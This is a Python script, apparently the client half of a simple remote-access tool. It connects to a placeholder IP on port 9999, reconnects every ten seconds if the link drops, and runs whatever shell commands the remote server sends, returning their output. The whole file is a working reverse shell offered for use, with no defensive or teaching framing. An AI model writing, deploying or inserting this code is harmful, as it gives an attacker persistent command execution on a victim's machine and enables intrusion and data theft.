import os
import subprocess
import socket
import time


#this function create socket for connecting two pc
def socket_create():
    try:
        global host 
        global port 
        global soc
        host = 'Write_Your_IP'
        port = 9999
        soc = socket.socket()
    except socket.error as err:
        print("Socket creation failed due to : "+str(err))

def socket_connect():
    try:
        global host 
        global port 
        global soc
        soc.connect((host,port))
    except socket.error as err:
        print("Socket connection error : "+str(err)) 
        time.sleep(10)
        socket_connect()

# this function is to recieve commands from server and run on clients machine
def recieve_commands():
    while True:
        data = soc.recv(20480) 
        #when data(or cmd) is sent to client from server it is send in bytes
        #so we have to decode it to "utf-8"
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if len(data) > 0:
            try:
                #this will open cmd and exectute the cmd
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_string = str(output_byte, "utf-8")
                soc.send(str.encode(output_string + str(os.getcwd())+ '> '))
                print(output_string)
            except:
                output_string = "Command not recogniZed\n"
                soc.send(str.encode(output_string + str(os.getcwd())+ '> '))
                print(output_string)


def main():
    global soc
    try:
        socket_create()
        socket_connect()
        recieve_commands()
    except:
        print("Error...")
        time.sleep(10)
    soc.close()
    main()

main()
